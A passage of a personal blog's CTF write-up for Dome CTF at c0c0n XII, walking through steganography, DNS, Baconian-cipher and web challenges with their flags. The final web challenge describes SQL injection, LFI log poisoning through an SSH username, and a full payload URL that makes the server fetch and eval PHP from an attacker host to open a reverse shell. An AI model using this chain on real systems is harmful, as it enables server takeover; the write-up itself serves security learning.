          <span class="o">}</span>
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>domectf{CK9eXT3gse0CvIqHODsipohUfXxjgFW}
</code></pre></div></div>

<p><strong><em>These are the challenges that my team solved at the event the following challenges were completed after the event</em></strong></p>

<p><img src="/assets/images/cocon-xii-ctf/egypt.png" alt="" /></p>

<p>In this challenge, we are given an audio file when played seems likely to be a spectrogram challenge because of the disturbance in the audio but when played further we could hear Black Sabbath’s Ironman after messing with the file I tried <a href="https://github.com/danielcardeenas/AudioStego">audiosteg</a> on it which gave out another wav file.</p>

<p><img src="/assets/images/cocon-xii-ctf/egypt1.png" alt="" /></p>

<p>When played it sounded like the dial-pad pressing of a phone (DTFM code). Inorder to extract the DTFM code from the file we can use a tool called multimon-ng.</p>

<p><img src="/assets/images/cocon-xii-ctf/egypt_multimon.png" alt="" /></p>

<p>Now we have the DTFM codes now we need to format it we can use a simple python script to do that first we can replace “DTFM:” with nothing which gives us only the numbers now with a bit of formating we have this.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1441571551451431641461731471061651251221216316122666466145154166112121641171412711154175
</code></pre></div></div>
<p>Now this set of numbers seems to be ascii but they are octal we can use an online converter to do the job which gives us the flag.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>domectf{gFuURQ3FR646elvJBtODWHl}
</code></pre></div></div>

<p><img src="/assets/images/cocon-xii-ctf/france.png" alt="" /></p>

<p>In this challenge, we have a riddle (Which I still don’t know what it means). But here is the solution all we have to do was to check the TXT record of that domain.</p>

<p><img src="/assets/images/cocon-xii-ctf/france_txt.png" alt="" /></p>

<p>The base64 string in the TXT record is the flag just decode it.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>domectf{6hau2Hd107GbDgiNGOJMw9PNPhAUtaaY}
</code></pre></div></div>

<p><img src="/assets/images/cocon-xii-ctf/madagascar.png" alt="" /></p>

<p>In this challenge, we have a weapon dealer’s site which has some images but no login or any dynamic data is served in the site so we started downloading the images and ran binwalk on it and one image had a zip file embedded in it.</p>

<p><img src="/assets/images/cocon-xii-ctf/madagascar1.png" alt="" /></p>

<p>But it is password protected  running strings over the same image which gave out something.</p>

<p><img src="/assets/images/cocon-xii-ctf/madagascar2.png" alt="" /></p>

<p>So to get the password we have to change the lowercase letters to A and uppercase letters to B(I still don’t know the logic behind that)</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dOYOuthinkThisSEnteNcEISboriNGbUttHepASsworDHasastRoNgCOnneCTiOnwiTHtHIssentenCE
ABBBAAAAAABAAABBAAABABBBAAAABBABAABAABBAAAABBAAAAABABABBAAABBABAAABBABBAAAAAAABB
</code></pre></div></div>

<p>This is a Baconian cipher we can use an online tool to decipher it.</p>

<p><img src="/assets/images/cocon-xii-ctf/madagascar3.png" alt="" /></p>

<p>By using the password to extract the zip file we have a couple of text files in which slab.txt has the flag.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>domectf{kPIx12IP6u004N6G6S2HheBVxrtWwJaL}
</code></pre></div></div>

<p><img src="/assets/images/cocon-xii-ctf/greenland.png" alt="" /></p>

<p>This is a base challenge were we have to execute code on the server and write the team name to /tmp/DOMECTF_BASE file.
So In this challenge, we have a e-commerce site that sells furnitures.</p>

<p><img src="/assets/images/cocon-xii-ctf/greenland1.png" alt="" /></p>

<p>By checking the hyperlinks we can see a login page which is vulnerable to SQL Injection.</p>

<p><img src="/assets/images/cocon-xii-ctf/greenland_sql.png" alt="" /></p>

<p>We can now login to the application using the password that we have.</p>

<p><img src="/assets/images/cocon-xii-ctf/greenland_login.png" alt="" /></p>

<p>By checking the profile page there is a parameter called name.</p>

<p><img src="/assets/images/cocon-xii-ctf/greenland_name.png" alt="" /></p>

<p>If we change the value of jessica the data displayed in the red box dissapears with later fuzzing we came to know that the site is vulnerable to LFI but the  application appends .log to the filename
 When we change the parameter data to profile.php?name=../../../../../../../../../var/log/auth</p>

<p><img src="/assets/images/cocon-xii-ctf/greenland_lfi.png" alt="" /></p>

<p>var/log/auth is the error log for ssh connections so if we can make an error in connecting ssh that would get stored in this file which when included it gets executed. Inorder to execute commands we need to use our php code as the username for an ssh connection.</p>

<p><img src="/assets/images/cocon-xii-ctf/greenland_ssh.png" alt="" /></p>

<p>Now include the auth file and the php code gets executed</p>

<p><img src="/assets/images/cocon-xii-ctf/greenland_exec.png" alt="" /></p>

<p>Because SSH usernames has a length restriction we cannot execute code directly so we need something small.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>To get a reverse shell we can use metasploit's web_delivery module
   
https://furniture-shop.domectf.in/dashboard/examples/profile.php?name=../../../../../../../../../var/log/auth&amp;c=php -d allow_url_fopen=true -r "eval(file_get_contents('http://ipaddr:8080/uqB7NiEfaNe'));"
</code></pre></div></div>

<p><img src="/assets/images/cocon-xii-ctf/greenland_msf.png" alt="" /></p>


        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#ctf" class="page__taxonomy-item" rel="tag">ctf</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#dome-ctf" class="page__taxonomy-item" rel="tag">dome ctf</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#jeoprady" class="page__taxonomy-item" rel="tag">jeoprady</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#capture-the-flag" class="page__taxonomy-item" rel="tag">capture the flag</a><span class="sep">, </span>
    
      
      
      <a href="/categories/#infosec" class="page__taxonomy-item" rel="tag">infosec</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2019-10-02T00:00:00+05:30">October 02, 2019</time></p>
        
      </footer>

      

      
  <nav class="pagination">
    
      <a href="/Sector-443-CTF-Walkthrough/" class="pagination--pager" title="Sector443 CTF Walkthrough
">Previous</a>
    
    
      <a href="/idor-to-rce/" class="pagination--pager" title="From Multiple IDORs leading to Code Execution on a different Host Container
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
</div>

    </div>

    

    <div class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    

    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2021 Rahul R</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>








  </body>
</html>
